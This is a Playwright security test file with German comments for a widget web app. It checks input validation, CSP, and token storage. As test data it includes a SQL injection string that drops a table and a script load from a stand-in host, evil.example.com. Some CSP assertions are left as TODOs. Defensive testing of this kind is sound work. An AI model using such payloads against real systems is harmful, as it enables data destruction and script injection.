import {expect, test} from '@playwright/test';
import {loginAsRole, createUserWithRole} from '../helpers/auth';
import {newApiRequestContext} from '../helpers/api';
import {createWidget, deleteWidgetById} from '../helpers/widgets';

/**
 * Security-Advanced-Tests: Bestenfalls-Ebene
 * 
 * Tests für erweiterte Security-Funktionalität (CSP, Payload-Validierung, etc.).
 */

test.describe('@bestenfalls Security Advanced', () => {
	// SEC-01 – manipulierte API-Payloads (z. B. negative `widget_id`) → korrekte Validierung
	test('@bestenfalls SEC-01: Negative Widget-ID wird abgelehnt', async ({page}) => {
		const api = await newApiRequestContext();
		const user = await createUserWithRole(api, 'demo', 'sec01');
		
		// Versuche, Widget mit negativer ID zu löschen
		const deleteRes = await api.delete('/api/widgets/-1', {
			headers: {Authorization: `Bearer ${user.access_token}`},
		});
		
		// Erwarte Validierungsfehler (422 Unprocessable Entity)
		expect(deleteRes.status()).toBe(422);
		
		await page.screenshot({path: 'test-results/sec-01-negative-id.png'});
	});
	
	test('@bestenfalls SEC-01: Widget-ID als String wird abgelehnt', async ({page}) => {
		const api = await newApiRequestContext();
		const user = await createUserWithRole(api, 'demo', 'sec01-string');
		
		// Versuche, Widget mit String-ID statt Integer zu löschen
		const deleteRes = await api.delete('/api/widgets/abc', {
			headers: {Authorization: `Bearer ${user.access_token}`},
		});
		
		// Erwarte Validierungsfehler oder 404
		expect([404, 422]).toContain(deleteRes.status());
	});
	
	test('@bestenfalls SEC-01: SQL-Injection in Widget-Name wird verhindert', async ({page}) => {
		const api = await newApiRequestContext();
		const user = await createUserWithRole(api, 'demo', 'sec01-sql');
		
		// Versuche SQL-Injection im Widget-Namen
		const sqlPayload = "'; DROP TABLE widgets; --";
		
		const createRes = await api.post('/api/widgets/', {
			data: {name: sqlPayload, config_json: '{}'},
			headers: {Authorization: `Bearer ${user.access_token}`},
		});
		
		// Widget sollte erstellt werden (Name wird escaped/sanitized)
		expect(createRes.ok()).toBeTruthy();
		const widget = await createRes.json();
		expect(widget.name).toBe(sqlPayload); // Als String gespeichert, nicht ausgeführt
		
		// Cleanup
		await deleteWidgetById(api, widget.id, user.access_token);
	});
	
	test('@bestenfalls SEC-01: Extrem lange Strings werden limitiert', async ({page}) => {
		const api = await newApiRequestContext();
		const user = await createUserWithRole(api, 'demo', 'sec01-long');
		
		// Versuche Widget mit extrem langem Namen zu erstellen
		const longName = 'A'.repeat(10_000);
		
		const createRes = await api.post('/api/widgets/', {
			data: {name: longName, config_json: '{}'},
			headers: {Authorization: `Bearer ${user.access_token}`},
		});
		
		// Erwarte entweder Erfolg mit getrimmtem String oder Validierungsfehler
		if (createRes.ok()) {
			const widget = await createRes.json();
			// Name sollte limitiert sein (z.B. max. 255 Zeichen)
			expect(widget.name.length).toBeLessThanOrEqual(255);
			await deleteWidgetById(api, widget.id, user.access_token);
		} else {
			// Oder Validierungsfehler ist auch akzeptabel
			expect(createRes.status()).toBe(422);
		}
	});
	
	// SEC-02 – CSP verhindert Inline-Scripts (Browser-Console prüfen)
	test('@bestenfalls SEC-02: CSP verhindert Inline-Scripts', async ({page}) => {
		// Track CSP-Violations
		const cspViolations: any[] = [];
		page.on('console', (msg) => {
			const text = msg.text();
			if (text.toLowerCase().includes('content security policy') ||
			    text.toLowerCase().includes('csp')) {
				cspViolations.push(text);
			}
		});
		
		// Navigiere zur App
		await page.goto('/');
		await page.waitForTimeout(2000);
		
		// Versuche, Inline-Script zu injizieren (sollte durch CSP blockiert werden)
		const scriptExecuted = await page.evaluate(() => {
			try {
				// Versuche eval (sollte durch CSP blockiert werden)
				eval('window.cspTestMarker = true');
				return (window as any).cspTestMarker === true;
			} catch (e) {
				return false;
			}
		});
		
		// CSP sollte eval() blockieren
		expect(scriptExecuted).toBe(false);
		
		// TODO: Sobald strikte CSP-Header gesetzt sind, verifiziere CSP-Violations
		// expect(cspViolations.length).toBeGreaterThan(0);
		
		await page.screenshot({path: 'test-results/sec-02-csp.png'});
	});
	
	test('@bestenfalls SEC-02: Externe Scripts werden durch CSP kontrolliert', async ({page}) => {
		const api = await newApiRequestContext();
		const user = await createUserWithRole(api, 'demo', 'sec02-external');
		
		// Login
		await loginAsRole(page, 'demo', 'sec02-external-ui');
		
		// Versuche, externes Script dynamisch zu laden
		const scriptLoaded = await page.evaluate(() => {
			return new Promise<boolean>((resolve) => {
				const script = document.createElement('script');
				script.src = 'https://evil.example.com/malicious.js';
				script.onload = () => resolve(true);
				script.onerror = () => resolve(false);
				document.head.appendChild(script);
				
				// Timeout nach 3 Sekunden
				setTimeout(() => resolve(false), 3000);
			});
		});
		
		// TODO: Sobald CSP konfiguriert ist, sollte externes Script blockiert werden
		// expect(scriptLoaded).toBe(false);
		
		await page.screenshot({path: 'test-results/sec-02-external-script.png'});
	});
	
	// SEC-03 – HTTPS-Enforcement (falls relevant)
	test.skip('@bestenfalls SEC-03: HTTP wird zu HTTPS redirected', async ({page}) => {
		// Dieser Test ist nur relevant, wenn die App in Produktion läuft
		// Im lokalen E2E-Setup mit http://localhost ist HTTPS nicht erzwungen
		
		// TODO: In Production-E2E-Tests aktivieren:
		// await page.goto('http://example.com');
		// expect(page.url()).toMatch(/^https:/);
	});
	
	// SEC-04 – Sensitive Daten werden nicht im LocalStorage gespeichert
	test('@bestenfalls SEC-04: Keine sensiblen Daten im LocalStorage', async ({page}) => {
		const api = await newApiRequestContext();
		const user = await createUserWithRole(api, 'demo', 'sec04');
		
		// Login
		await loginAsRole(page, 'demo', 'sec04-ui');
		await expect(page.getByTestId('home.loginLink')).not.toBeVisible();
		
		// Prüfe LocalStorage-Inhalte
		const storageData = await page.evaluate(() => {
			const data: Record<string, string> = {};
			for (let i = 0; i < localStorage.length; i++) {
				const key = localStorage.key(i);
				if (key) {
					data[key] = localStorage.getItem(key) || '';
				}
			}
			return data;
		});
		
		// Verifiziere, dass keine Passwörter gespeichert sind
		Object.values(storageData).forEach(value => {
			expect(value.toLowerCase()).not.toContain('password');
			expect(value.toLowerCase()).not.toContain('passwort');
		});
		
		// Nur Refresh-Token sollte gespeichert sein (Access-Token nur in-memory)
		expect(storageData).toHaveProperty('hw_refresh_token');
		
		// Access-Token sollte NICHT im LocalStorage sein
		expect(storageData).not.toHaveProperty('access_token');
		expect(storageData).not.toHaveProperty('hw_access_token');
		
		await page.screenshot({path: 'test-results/sec-04-storage-check.png'});
	});
});
